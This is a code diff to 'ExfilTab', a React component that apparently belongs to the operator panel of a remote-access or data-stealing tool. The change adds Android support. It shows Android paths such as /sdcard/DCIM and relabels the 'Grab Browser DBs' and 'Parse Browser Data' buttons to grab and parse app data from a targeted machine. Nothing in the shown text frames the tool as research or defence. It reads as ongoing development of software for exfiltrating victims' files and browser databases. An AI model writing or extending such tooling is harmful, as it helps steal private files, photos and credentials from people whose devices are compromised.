@@ -40,7 +40,8 @@ interface FileEntry {
   created_at: string | null;
 }
 
-const ExfilTab = ({ machineId }: { machineId: string }) => {
+const ExfilTab = ({ machineId, clientOs }: { machineId: string; clientOs?: string | null }) => {
+  const isAndroid = clientOs?.toLowerCase().includes("android") ?? false;
   const [files, setFiles] = useState<FileEntry[]>([]);
   const [loading, setLoading] = useState(false);
   const [requestPath, setRequestPath] = useState("");
@@ -161,7 +162,7 @@ const ExfilTab = ({ machineId }: { machineId: string }) => {
             <Input
               value={requestPath}
               onChange={(e) => setRequestPath(e.target.value)}
-              placeholder="Remote file or directory path (e.g. C:\Users\admin\Documents)"
+              placeholder={isAndroid ? "Remote file or directory path (e.g. /sdcard/DCIM)" : "Remote file or directory path (e.g. C:\\Users\\admin\\Documents)"}
               className="font-mono text-sm h-8"
               onKeyDown={(e) => e.key === "Enter" && requestFileExfil()}
             />
@@ -193,7 +194,7 @@ const ExfilTab = ({ machineId }: { machineId: string }) => {
               onClick={requestBrowserDBs}
               disabled={sending}
             >
-              <HardDrive className="w-3 h-3" /> Grab Browser DBs
+              <HardDrive className="w-3 h-3" /> {isAndroid ? "Grab App Data" : "Grab Browser DBs"}
             </Button>
             <Button
               variant="outline"
@@ -203,7 +204,7 @@ const ExfilTab = ({ machineId }: { machineId: string }) => {
               disabled={parsingBrowser}
             >
               {parsingBrowser ? <Loader2 className="w-3 h-3 animate-spin" /> : <Globe className="w-3 h-3" />}
-              Parse Browser Data
+              {isAndroid ? "Parse App Data" : "Parse Browser Data"}
             </Button>
             <Button
               variant="outline"
